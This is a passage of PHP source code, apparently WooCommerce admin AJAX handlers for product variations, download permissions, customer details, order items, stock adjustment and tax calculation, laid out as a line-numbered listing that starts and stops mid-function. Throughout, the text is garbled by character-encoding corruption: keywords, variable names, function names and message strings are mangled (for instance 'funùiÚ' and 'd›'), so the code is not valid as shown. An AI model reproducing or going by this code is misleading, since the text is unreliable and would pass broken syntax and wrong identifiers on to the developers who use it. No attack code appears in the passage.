['v¬ŸtiÚ_po¡_id'] = 
$v¬ŸtiÚ_id
;

551 
$©Œibu‹s
 = (
¬¿y
è
	`maybe_un£rŸlize
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_´oduù_©Œibu‹s', 
Œue
 ) );

554 
$x_şas£s
 = 
	`¬¿y_f‹r
(
	`¬¿y_m­
('Œim', 
	`ex¶ode
("\n", 
	`g‘_İtiÚ
('woocommerce_tax_classes'))));

555 
$x_şass_İtiÚs
 = 
	`¬¿y
();

556 
$x_şass_İtiÚs
['·»Á'] =
	`__
( 'Same‡s…arent', 'woocommerce' );

557 
$x_şass_İtiÚs
[''] = 
	`__
( 'Standard', 'woocommerce' );

558 ià(
$x_şas£s
è
	`fÜ—ch
 ( $x_şas£ 
as
 
$şass
 )

559 
$x_şass_İtiÚs
[
	`§n™ize_t™Ë
(
$şass
)] = $class;

562 
$·»Á_d©a
 = 
	`¬¿y
(

563 'id' => 
$po¡_id
,

564 '©Œibu‹s' => 
$©Œibu‹s
,

565 'x_şass_İtiÚs' => 
$x_şass_İtiÚs
,

566 'sku' => 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_sku', 
Œue
 ),

567 'weight' => 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_weight', 
Œue
 ),

568 'Ëngth' => 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_Ëngth', 
Œue
 ),

569 'width' => 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_width', 
Œue
 ),

570 'height' => 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_height', 
Œue
 ),

571 'x_şass' => 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_x_şass', 
Œue
 )

574 iàĞ! 
$·»Á_d©a
['weight'] )

575 
$·»Á_d©a
['weight'] = '0.00';

577 iàĞ! 
$·»Á_d©a
['length'] )

578 
$·»Á_d©a
['length'] = '0';

580 iàĞ! 
$·»Á_d©a
['width'] )

581 
$·»Á_d©a
['width'] = '0';

583 iàĞ! 
$·»Á_d©a
['height'] )

584 
$·»Á_d©a
['height'] = '0';

586 
$_x_şass
 = '';

587 
$_dowÆßdabË_fes
 = '';

588 
$image_id
 = 0;

589 
$v¬ŸtiÚ
 = 
	`g‘_po¡
Ğ
$v¬ŸtiÚ_id
 );

591 
	`šşude
( 'admin/post-types/meta-boxes/views/html-variation-admin.php' );

594 
	`d›
();

595 
	}
}

600 
public
 
funùiÚ
 
	$lšk_®l_v¬ŸtiÚs
() {

602 iàĞ! 
	`defšed
( 'WC_MAX_LINKED_VARIATIONS' ) ) {

603 
	`defše
( 'WC_MAX_LINKED_VARIATIONS', 49 );

606 
	`check_ajax_»ã»r
( 'link-variations', 'security' );

608 @
	`£t_time_lim™
(0);

610 
$po¡_id
 = 
	`štv®
Ğ
$_POST
['post_id'] );

612 iàĞ! 
$po¡_id
 ) 
	`d›
();

614 
$v¬ŸtiÚs
 = 
	`¬¿y
();

616 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$po¡_id
, 
	`¬¿y
( 'product_type' => 'variable' ) );

619 
	`fÜ—ch
 ( 
$_´oduù
->
	`g‘_©Œibu‹s
(è
as
 
$©Œibu‹
 ) {

621 iàĞ! 
$©Œibu‹
['is_variation'] ) ;

623 
$©Œibu‹_f›ld_Çme
 = '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['name'] );

625 iàĞ
$©Œibu‹
['is_taxonomy'] ) {

626 
$İtiÚs
 = 
	`wc_g‘_´oduù_‹rms
Ğ
$po¡_id
, 
$©Œibu‹
['Çme'], 
	`¬¿y
( 'fields' => 'slugs' ) );

628 
$İtiÚs
 = 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] );

631 
$İtiÚs
 = 
	`¬¿y_m­
( 'sanitize_title',‡rray_map( 'trim', $options ) );

633 
$v¬ŸtiÚs
[ 
$©Œibu‹_f›ld_Çme
 ] = 
$İtiÚs
;

637 iàĞĞ
$v¬ŸtiÚs
 ) =ğ0 ) 
	`d›
();

640 
$avaabË_v¬ŸtiÚs
 = 
	`¬¿y
();

642 
	`fÜ—ch
Ğ
$_´oduù
->
	`g‘_chd»n
(è
as
 
$chd_id
 ) {

643 
$chd
 = 
$_´oduù
->
	`g‘_chd
Ğ
$chd_id
 );

645 iàĞ! 
	`em±y
Ğ
$chd
->
v¬ŸtiÚ_id
 ) ) {

646 
$avaabË_v¬ŸtiÚs
[] = 
$chd
->
	`g‘_v¬ŸtiÚ_©Œibu‹s
();

651 
$v¬ŸtiÚ_po¡_d©a
 = 
	`¬¿y
(

652 'po¡_t™Ë' => 'Produù #' . 
$po¡_id
 . ' Variation',

655 'po¡_authÜ' => 
	`g‘_cu¼’t_u£r_id
(),

656 'po¡_·»Á' => 
$po¡_id
,

661 iàĞ! 
	`funùiÚ_exi¡s
( 'array_cartesian' ) ) {

666 
funùiÚ
 
	`¬¿y_ÿ¹esŸn
Ğ
$šput
 ) {

667 
$»suÉ
 = 
	`¬¿y
();

669  
	`li¡
Ğ
$key
, 
$v®ues
 ) = 
	`—ch
Ğ
$šput
 ) ) {

671 iàĞ
	`em±y
Ğ
$v®ues
 ) ) {

676 iàĞ
	`em±y
Ğ
$»suÉ
 ) ) {

677 
	`fÜ—ch
 ( 
$v®ues
 
as
 
$v®ue
 ) {

678 
$»suÉ
[] = 
	`¬¿y
Ğ
$key
 => 
$v®ue
 );

691 
$­³nd
 = 
	`¬¿y
();

692 
	`fÜ—ch
Ğ
$»suÉ
 
as
 &
$´oduù
 ) {

696 
$´oduù
[ 
$key
 ] = 
	`¬¿y_shiá
Ğ
$v®ues
 );

700 
$cİy
 = 
$´oduù
;

703 
	`fÜ—ch
Ğ
$v®ues
 
as
 
$™em
 ) {

704 
$cİy
[ 
$key
 ] = 
$™em
;

705 
$­³nd
[] = 
$cİy
;

709 
	`¬¿y_unshiá
Ğ
$v®ues
, 
$´oduù
[ 
$key
 ] );

713 
$»suÉ
 = 
	`¬¿y_m”ge
Ğ$»suÉ, 
$­³nd
 );

717  
$»suÉ
;

721 
$v¬ŸtiÚ_ids
 = 
	`¬¿y
();

722 
$added
 = 0;

723 
$possibË_v¬ŸtiÚs
 = 
	`¬¿y_ÿ¹esŸn
Ğ
$v¬ŸtiÚs
 );

725 
	`fÜ—ch
 ( 
$possibË_v¬ŸtiÚs
 
as
 
$v¬ŸtiÚ
 ) {

728 iàĞ
	`š_¬¿y
Ğ
$v¬ŸtiÚ
, 
$avaabË_v¬ŸtiÚs
 ) )

731 
$v¬ŸtiÚ_id
 = 
	`wp_š£¹_po¡
Ğ
$v¬ŸtiÚ_po¡_d©a
 );

733 
$v¬ŸtiÚ_ids
[] = 
$v¬ŸtiÚ_id
;

735 
	`fÜ—ch
 ( 
$v¬ŸtiÚ
 
as
 
$key
 => 
$v®ue
 ) {

736 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, 
$key
, 
$v®ue
 );

739 
$added
++;

741 
	`do_aùiÚ
Ğ'´oduù_v¬ŸtiÚ_lšked', 
$v¬ŸtiÚ_id
 );

743 iàĞ
$added
 > 
WC_MAX_LINKED_VARIATIONS
 )

747 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$po¡_id
 );

749 
echo
 
$added
;

751 
	`d›
();

752 
	}
}

757 
public
 
funùiÚ
 
	$»voke_acûss_to_dowÆßd
() {

759 
	`check_ajax_»ã»r
( 'revoke-access', 'security' );

761 
glob®
 
$wpdb
;

763 
$dowÆßd_id
 = 
$_POST
['download_id'];

764 
$´oduù_id
 = 
	`štv®
Ğ
$_POST
['product_id'] );

765 
$Üd”_id
 = 
	`štv®
Ğ
$_POST
['order_id'] );

767 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_dowÆßdabË_´oduù_³rmissiÚ WHERE ord”_id = %d AND…roduù_id = %d AND dowÆßd_id = %s;", 
$Üd”_id
, 
$´oduù_id
, 
$dowÆßd_id
 ) );

769 
	`do_aùiÚ
Ğ'woocomm”û_ajax_»voke_acûss_to_´oduù_dowÆßd', 
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”_id
 );

771 
	`d›
();

772 
	}
}

777 
public
 
funùiÚ
 
	$g¿Á_acûss_to_dowÆßd
() {

779 
	`check_ajax_»ã»r
( 'grant-access', 'security' );

781 
glob®
 
$wpdb
;

783 
$wpdb
->
	`hide_”rÜs
();

785 
$Üd”_id
 = 
	`štv®
Ğ
$_POST
['order_id'] );

786 
$´oduù_ids
 = 
$_POST
['product_ids'];

787 
$loİ
 = 
	`štv®
Ğ
$_POST
['loop'] );

788 
$fe_couÁ”
 = 0;

789 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

791 iàĞ! 
	`is_¬¿y
Ğ
$´oduù_ids
 ) ) {

792 
$´oduù_ids
 = 
	`¬¿y
( $product_ids );

795 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

796 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

797 
$fes
 = 
$´oduù
->
	`g‘_fes
();

799 iàĞ! 
$Üd”
->
blšg_ema
 )

800 
	`d›
();

802 iàĞ
$fes
 ) {

803 
	`fÜ—ch
 ( 
$fes
 
as
 
$dowÆßd_id
 => 
$fe
 ) {

804 iàĞ
$š£¹ed_id
 = 
	`wc_dowÆßdabË_fe_³rmissiÚ
Ğ
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 ) ) {

807 
$dowÆßd
 = 
$wpdb
->
	`g‘_row
Ğ$wpdb->
	`´•¬e
Ğ"SELECT * FROM {$wpdb->´efix}woocomm”û_dowÆßdabË_´oduù_³rmissiÚ WHERE…”missiÚ_id = %d", 
$š£¹ed_id
 ) );

809 
$loİ
 ++;

810 
$fe_couÁ”
 ++;

812 iàĞ
	`is£t
Ğ
$fe
['name'] ) ) {

813 
$fe_couÁ
 = 
$fe
['name'];

815 
$fe_couÁ
 = 
	`¥rštf
Ğ
	`__
Ğ'F%d', 'woocomm”û' ), 
$fe_couÁ”
 );

817 
	`šşude
( 'admin/post-types/meta-boxes/views/html-order-download-permission.php' );

823 
	`d›
();

824 
	}
}

829 
public
 
funùiÚ
 
	$g‘_cu¡om”_d‘as
() {

831 
	`check_ajax_»ã»r
( 'get-customer-details', 'security' );

833 
$this
->
	`jsÚ_h—d”s
();

835 
$u£r_id
 = (è
	`Œim
(
	`¡r¦ashes
(
$_POST
['user_id']));

836 
$ty³_to_lßd
 = 
	`esc_©Œ
(
	`Œim
(
	`¡r¦ashes
(
$_POST
['type_to_load'])));

838 
$cu¡om”_d©a
 = 
	`¬¿y
(

839 
$ty³_to_lßd
 . '_fœ¡_Çme' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_fœ¡_Çme', 
Œue
 ),

840 
$ty³_to_lßd
 . '_Ï¡_Çme' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_Ï¡_Çme', 
Œue
 ),

841 
$ty³_to_lßd
 . '_com·ny' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_com·ny', 
Œue
 ),

842 
$ty³_to_lßd
 . '_add»ss_1' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_add»ss_1', 
Œue
 ),

843 
$ty³_to_lßd
 . '_add»ss_2' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_add»ss_2', 
Œue
 ),

844 
$ty³_to_lßd
 . '_c™y' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_c™y', 
Œue
 ),

845 
$ty³_to_lßd
 . '_po¡code' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_po¡code', 
Œue
 ),

846 
$ty³_to_lßd
 . '_couÁry' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_couÁry', 
Œue
 ),

847 
$ty³_to_lßd
 . '_¡©e' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_¡©e', 
Œue
 ),

848 
$ty³_to_lßd
 . '_ema' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_ema', 
Œue
 ),

849 
$ty³_to_lßd
 . '_phÚe' => 
	`g‘_u£r_m‘a
Ğ
$u£r_id
, $ty³_to_lßd . '_phÚe', 
Œue
 ),

852 
$cu¡om”_d©a
 = 
	`­¶y_f‹rs
( 'woocommerce_found_customer_details', $customer_data );

854 
echo
 
	`jsÚ_’code
Ğ
$cu¡om”_d©a
 );

857 
	`d›
();

858 
	}
}

863 
public
 
funùiÚ
 
	$add_Üd”_™em
() {

864 
glob®
 
$wpdb
;

866 
	`check_ajax_»ã»r
( 'order-item', 'security' );

868 
$™em_to_add
 = 
	`§n™ize_‹xt_f›ld
Ğ
$_POST
['item_to_add'] );

869 
$Üd”_id
 = 
	`absšt
Ğ
$_POST
['order_id'] );

872 iàĞ! 
	`is_num”ic
Ğ
$™em_to_add
 ) )

873 
	`d›
();

875 
$po¡
 = 
	`g‘_po¡
Ğ
$™em_to_add
 );

877 iàĞ! 
$po¡
 || ( $po¡->
po¡_ty³
 !== 'product' && $post->post_type !== 'product_variation' ) )

878 
	`d›
();

880 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$po¡
->
ID
 );

882 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

883 
$şass
 = 'new_row';

886 
$™em
 = 
	`¬¿y
();

888 
$™em
['´oduù_id'] = 
$_´oduù
->
id
;

889 
$™em
['v¬ŸtiÚ_id'] = 
	`is£t
Ğ
$_´oduù
->
v¬ŸtiÚ_id
 ) ? $_product->variation_id : '';

890 
$™em
['v¬ŸtiÚ_d©a'] = 
	`is£t
Ğ
$_´oduù
->
v¬ŸtiÚ_d©a
 ) ? $_product->variation_data : '';

891 
$™em
['Çme'] = 
$_´oduù
->
	`g‘_t™Ë
();

892 
$™em
['x_şass'] = 
$_´oduù
->
	`g‘_x_şass
();

893 
$™em
['qty'] = 1;

894 
$™em
['lše_subtÙ®'] = 
	`wc_fÜm©_decim®
Ğ
$_´oduù
->
	`g‘_´iû_exşudšg_x
() );

895 
$™em
['line_subtotal_tax'] = '';

896 
$™em
['lše_tÙ®'] = 
	`wc_fÜm©_decim®
Ğ
$_´oduù
->
	`g‘_´iû_exşudšg_x
() );

897 
$™em
['line_tax'] = '';

900 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

901 'Üd”_™em_Çme' => 
$™em
['name'],

906 iàĞ
$™em_id
 ) {

907 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_qty', 
$™em
['qty'] );

908 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_x_şass', 
$™em
['tax_class'] );

909 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_´oduù_id', 
$™em
['product_id'] );

910 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_v¬ŸtiÚ_id', 
$™em
['variation_id'] );

911 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®', 
$™em
['line_subtotal'] );

912 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®_x', 
$™em
['line_subtotal_tax'] );

913 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_tÙ®', 
$™em
['line_total'] );

914 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_x', 
$™em
['line_tax'] );

917 iàĞ
$™em
['v¬ŸtiÚ_d©a'] && 
	`is_¬¿y
( $item['variation_data'] ) ) {

918 
	`fÜ—ch
 ( 
$™em
['v¬ŸtiÚ_d©a'] 
as
 
$key
 => 
$v®ue
 ) {

919 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 
	`¡r_»¶aû
Ğ'©Œibu‹_', '', 
$key
 ), 
$v®ue
 );

923 
	`do_aùiÚ
Ğ'woocomm”û_ajax_add_Üd”_™em_m‘a', 
$™em_id
, 
$™em
 );

926 
$™em
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ajax_Üd”_™em', $™em, 
$™em_id
 );

928 
	`šşude
( 'admin/post-types/meta-boxes/views/html-order-item.php' );

931 
	`d›
();

932 
	}
}

937 
public
 
funùiÚ
 
	$add_Üd”_ãe
() {

939 
	`check_ajax_»ã»r
( 'order-item', 'security' );

941 
$Üd”_id
 = 
	`absšt
Ğ
$_POST
['order_id'] );

942 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

945 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

951 iàĞ
$™em_id
 ) {

952 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_tax_class', '' );

953 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_line_total', '' );

954 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_line_tax', '' );

957 
	`šşude
( 'admin/post-types/meta-boxes/views/html-order-fee.php' );

960 
	`d›
();

961 
	}
}

966 
public
 
funùiÚ
 
	$»move_Üd”_™em
() {

967 
glob®
 
$wpdb
;

969 
	`check_ajax_»ã»r
( 'order-item', 'security' );

971 
$Üd”_™em_ids
 = 
$_POST
['order_item_ids'];

973 iàĞĞ
$Üd”_™em_ids
 ) > 0 ) {

974 
	`fÜ—ch
Ğ
$Üd”_™em_ids
 
as
 
$id
 ) {

975 
	`wc_d–‘e_Üd”_™em
Ğ
	`absšt
Ğ
$id
 ) );

979 
	`d›
();

980 
	}
}

985 
public
 
funùiÚ
 
	$»duû_Üd”_™em_¡ock
() {

986 
glob®
 
$wpdb
;

988 
	`check_ajax_»ã»r
( 'order-item', 'security' );

990 
$Üd”_id
 = 
	`absšt
Ğ
$_POST
['order_id'] );

991 
$Üd”_™em_ids
 = 
	`is£t
Ğ
$_POST
['Üd”_™em_ids'] ) ? $_POST['Üd”_™em_ids'] : 
	`¬¿y
();

992 
$Üd”_™em_qty
 = 
	`is£t
Ğ
$_POST
['Üd”_™em_qty'] ) ? $_POST['Üd”_™em_qty'] : 
	`¬¿y
();

993 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

994 
$Üd”_™ems
 = 
$Üd”
->
	`g‘_™ems
();

995 
$»tuº
 = 
	`¬¿y
();

997 iàĞ
$Üd”
 && ! 
	`em±y
Ğ
$Üd”_™ems
 ) && Ğ
$Üd”_™em_ids
 ) > 0 ) {

999 
	`fÜ—ch
 ( 
$Üd”_™ems
 
as
 
$™em_id
 => 
$Üd”_™em
 ) {

1002 iàĞ! 
	`š_¬¿y
Ğ
$™em_id
, 
$Üd”_™em_ids
 ) )

1005 
$_´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$Üd”_™em
 );

1007 iàĞ
$_´oduù
->
	`exi¡s
(è&& $_´oduù->
	`mªagšg_¡ock
(è&& 
	`is£t
Ğ
$Üd”_™em_qty
[ 
$™em_id
 ] ) && $order_item_qty[ $item_id ] > 0 ) {

1009 
$Şd_¡ock
 = 
$_´oduù
->
¡ock
;

1010 
$¡ock_chªge
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_»duû_Üd”_¡ock_quªt™y', 
$Üd”_™em_qty
[ 
$™em_id
 ], $item_id );

1011 
$Ãw_quªt™y
 = 
$_´oduù
->
	`»duû_¡ock
Ğ
$¡ock_chªge
 );

1013 
$»tuº
[] = 
	`¥rštf
Ğ
	`__
Ğ'I‹m #% ¡ock„eduûd from % tØ%s.', 'woocomm”û' ), 
$Üd”_™em
['´oduù_id'], 
$Şd_¡ock
, 
$Ãw_quªt™y
 );

1014 
$Üd”
->
	`add_Üd”_nÙe
Ğ
	`¥rštf
Ğ
	`__
Ğ'I‹m #% ¡ock„eduûd from % tØ%s.', 'woocomm”û' ), 
$Üd”_™em
['´oduù_id'], 
$Şd_¡ock
, 
$Ãw_quªt™y
) );

1015 
$Üd”
->
	`£nd_¡ock_nÙifiÿtiÚs
Ğ
$_´oduù
, 
$Ãw_quªt™y
, 
$Üd”_™em_qty
[ 
$™em_id
 ] );

1019 
	`do_aùiÚ
Ğ'woocomm”û_»duû_Üd”_¡ock', 
$Üd”
 );

1021 iàĞ
	`em±y
Ğ
$»tuº
 ) )

1022 
$»tuº
[] = 
	`__
( 'No…roducts hadheir stock„educed -hey may‚ot have stock managementƒnabled.', 'woocommerce' );

1024 
echo
 
	`im¶ode
Ğ', ', 
$»tuº
 );

1027 
	`d›
();

1028 
	}
}

1033 
public
 
funùiÚ
 
	$šü—£_Üd”_™em_¡ock
() {

1034 
glob®
 
$wpdb
;

1036 
	`check_ajax_»ã»r
( 'order-item', 'security' );

1038 
$Üd”_id
 = 
	`absšt
Ğ
$_POST
['order_id'] );

1039 
$Üd”_™em_ids
 = 
	`is£t
Ğ
$_POST
['Üd”_™em_ids'] ) ? $_POST['Üd”_™em_ids'] : 
	`¬¿y
();

1040 
$Üd”_™em_qty
 = 
	`is£t
Ğ
$_POST
['Üd”_™em_qty'] ) ? $_POST['Üd”_™em_qty'] : 
	`¬¿y
();

1041 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

1042 
$Üd”_™ems
 = 
$Üd”
->
	`g‘_™ems
();

1043 
$»tuº
 = 
	`¬¿y
();

1045 iàĞ
$Üd”
 && ! 
	`em±y
Ğ
$Üd”_™ems
 ) && Ğ
$Üd”_™em_ids
 ) > 0 ) {

1047 
	`fÜ—ch
 ( 
$Üd”_™ems
 
as
 
$™em_id
 => 
$Üd”_™em
 ) {

1050 iàĞ! 
	`š_¬¿y
Ğ
$™em_id
, 
$Üd”_™em_ids
 ) )

1053 
$_´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$Üd”_™em
 );

1055 iàĞ
$_´oduù
->
	`exi¡s
(è&& $_´oduù->
	`mªagšg_¡ock
(è&& 
	`is£t
Ğ
$Üd”_™em_qty
[ 
$™em_id
 ] ) && $order_item_qty[ $item_id ] > 0 ) {

1057 
$Şd_¡ock
 = 
$_´oduù
->
¡ock
;

1058 
$¡ock_chªge
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_»¡Üe_Üd”_¡ock_quªt™y', 
$Üd”_™em_qty
[ 
$™em_id
 ], $item_id );

1059 
$Ãw_quªt™y
 = 
$_´oduù
->
	`šü—£_¡ock
Ğ
$¡ock_chªge
 );

1061 
$»tuº
[] = 
	`¥rštf
Ğ
	`__
Ğ'I‹m #% ¡ock inü—£d from % tØ%s.', 'woocomm”û' ), 
$Üd”_™em
['´oduù_id'], 
$Şd_¡ock
, 
$Ãw_quªt™y
 );

1062 
$Üd”
->
	`add_Üd”_nÙe
Ğ
	`¥rštf
Ğ
	`__
Ğ'I‹m #% ¡ock inü—£d from % tØ%s.', 'woocomm”û' ), 
$Üd”_™em
['´oduù_id'], 
$Şd_¡ock
, 
$Ãw_quªt™y
 ) );

1066 
	`do_aùiÚ
Ğ'woocomm”û_»¡Üe_Üd”_¡ock', 
$Üd”
 );

1068 iàĞ
	`em±y
Ğ
$»tuº
 ) )

1069 
$»tuº
[] = 
	`__
( 'No…roducts hadheir stock increased -hey may‚ot have stock managementƒnabled.', 'woocommerce' );

1071 
echo
 
	`im¶ode
Ğ', ', 
$»tuº
 );

1074 
	`d›
();

1075 
	}
}

1080 
public
 
funùiÚ
 
	$add_Üd”_™em_m‘a
() {

1081 
glob®
 
$wpdb
;

1083 
	`check_ajax_»ã»r
( 'order-item', 'security' );

1085 
$m‘a_id
 = 
	`wc_add_Üd”_™em_m‘a
Ğ
	`absšt
Ğ
$_POST
['Üd”_™em_id'] ), 
	`__
( 'Name', 'woocommerce' ), __( 'Value', 'woocommerce' ) );

1087 iàĞ
$m‘a_id
 ) {

1089 
echo
 '<Œ d©a-m‘a_id="' . 
	`esc_©Œ
Ğ
$m‘a_id
 ) . '"><td><inputype="text"‚ame="meta_key[' . $meta_id . ']" /><textarea‚ame="meta_value[' . $meta_id . ']"></textarea></td><td width="1%"><button class="remove_order_item_meta button">&times;</button></td></tr>';

1093 
	`d›
();

1094 
	}
}

1099 
public
 
funùiÚ
 
	$»move_Üd”_™em_m‘a
() {

1100 
glob®
 
$wpdb
;

1102 
	`check_ajax_»ã»r
( 'order-item', 'security' );

1104 
$m‘a_id
 = 
	`absšt
Ğ
$_POST
['meta_id'] );

1106 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™emm‘¨WHERE m‘a_id = %d", 
$m‘a_id
 ) );

1108 
	`d›
();

1109 
	}
}

1114 
public
 
funùiÚ
 
	$ÿlc_lše_xes
() {

1115 
glob®
 
$wpdb
;

1117 
	`check_ajax_»ã»r
( 'calc-totals', 'security' );

1119 
$this
->
	`jsÚ_h—d”s
();

1121 
$x
 = 
Ãw
 
	`WC_Tax
();

1123 
$xes
 = 
$x_rows
 = 
$™em_xes
 = 
$shpšg_xes
 = 
	`¬¿y
();

1125 
$Üd”_id
 = 
	`absšt
Ğ
$_POST
['order_id'] );

1126 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

1127 
$couÁry
 = 
	`¡¹ouµ”
Ğ
	`esc_©Œ
Ğ
$_POST
['country'] ) );

1128 
$¡©e
 = 
	`¡¹ouµ”
Ğ
	`esc_©Œ
Ğ
$_POST
['state'] ) );

1129 
$po¡code
 = 
	`¡¹ouµ”
Ğ
	`esc_©Œ
Ğ
$_POST
['postcode'] ) );

1130 
$c™y
 = 
	`§n™ize_t™Ë
Ğ
	`esc_©Œ
Ğ
$_POST
['city'] ) );

1132 
$™ems
 = 
	`is£t
Ğ
$_POST
['™ems'] ) ? $_POST['™ems'] : 
	`¬¿y
();

1133 
$shpšg
 = 
$_POST
['shipping'];

1134 
$™em_x
 = 0;

1137 iàĞĞ
$™ems
 ) > 0 ) {

1138 
	`fÜ—ch
Ğ
$™ems
 
as
 
$™em_id
 => 
$™em
 ) {

1140 
$™em_id
 = 
	`absšt
( $item_id );

1141 
$lše_subtÙ®
 = 
	`is£t
Ğ
$™em
['lše_subtÙ®'] ) ? 
	`wc_fÜm©_decim®
( $item['line_subtotal'] ) : 0;

1142 
$lše_tÙ®
 = 
	`wc_fÜm©_decim®
Ğ
$™em
['line_total'] );

1143 
$x_şass
 = 
	`§n™ize_‹xt_f›ld
Ğ
$™em
['tax_class'] );

1144 
$´oduù_id
 = 
$Üd”
->
	`g‘_™em_m‘a
Ğ
$™em_id
, '_´oduù_id', 
Œue
 );

1146 iàĞ! 
$™em_id
 || 
$x_şass
 == '0' )

1150 iàĞ
	`g‘_po¡_ty³
Ğ
$´oduù_id
 ) == 'product' ) {

1151 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

1152 
$™em_x_¡©us
 = 
$_´oduù
->
	`g‘_x_¡©us
();

1154 
$™em_x_¡©us
 = 'taxable';

1158 iàĞ
$™em_x_¡©us
 == 'taxable' ) {

1160 
$x_¿‹s
 = 
$x
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

1161 'couÁry' => 
$couÁry
,

1162 '¡©e' => 
$¡©e
,

1163 'po¡code' => 
$po¡code
,

1164 'c™y' => 
$c™y
,

1165 'x_şass' => 
$x_şass


1168 
$lše_subtÙ®_xes
 = 
$x
->
	`ÿlc_x
Ğ
$lše_subtÙ®
, 
$x_¿‹s
, 
çl£
 );

1169 
$lše_xes
 = 
$x
->
	`ÿlc_x
Ğ
$lše_tÙ®
, 
$x_¿‹s
, 
çl£
 );

1170 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$lše_subtÙ®_xes
 );

1171 
$lše_x
 = 
	`¬¿y_sum
Ğ
$lše_xes
 );

1173 iàĞ
$lše_subtÙ®_x
 < 0 )

1174 
$lše_subtÙ®_x
 = 0;

1176 iàĞ
$lše_x
 < 0 )

1177 
$lše_x
 = 0;

1179 
$™em_xes
[ 
$™em_id
 ] = 
	`¬¿y
(

1180 'lše_subtÙ®_x' => 
	`wc_fÜm©_loÿlized_´iû
Ğ
$lše_subtÙ®_x
 ),

1181 'lše_x' => 
	`wc_fÜm©_loÿlized_´iû
Ğ
$lše_x
 )

1184 
$™em_x
 +ğ
$lše_x
;

1187 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$xes
 + 
$lše_xes
 ) 
as
 
$key
 )

1188 
$xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$lše_xes
[ $key ] ) ? $line_taxes[ $key ] : 0 ) + ( isset( $taxes[ $key ] ) ? $taxes[ $key ] : 0 );

1195 
$m©ched_x_¿‹s
 = 
	`¬¿y
();

1197 
$x_¿‹s
 = 
$x
->
	`fšd_¿‹s
Ğ
	`¬¿y
(

1198 'couÁry' => 
$couÁry
,

1199 '¡©e' => 
$¡©e
,

1200 'po¡code' => 
$po¡code
,

1201 'c™y' => 
$c™y
,

1205 iàĞ
$x_¿‹s
 )

1206 
	`fÜ—ch
 ( 
$x_¿‹s
 
as
 
$key
 => 
$¿‹
 )

1207 iàĞ
	`is£t
Ğ
$¿‹
['shipping'] ) && $rate['shipping'] == 'yes' )

1208 
$m©ched_x_¿‹s
[ 
$key
 ] = 
$¿‹
;

1210 
$shpšg_xes
 = 
$x
->
	`ÿlc_shpšg_x
Ğ
$shpšg
, 
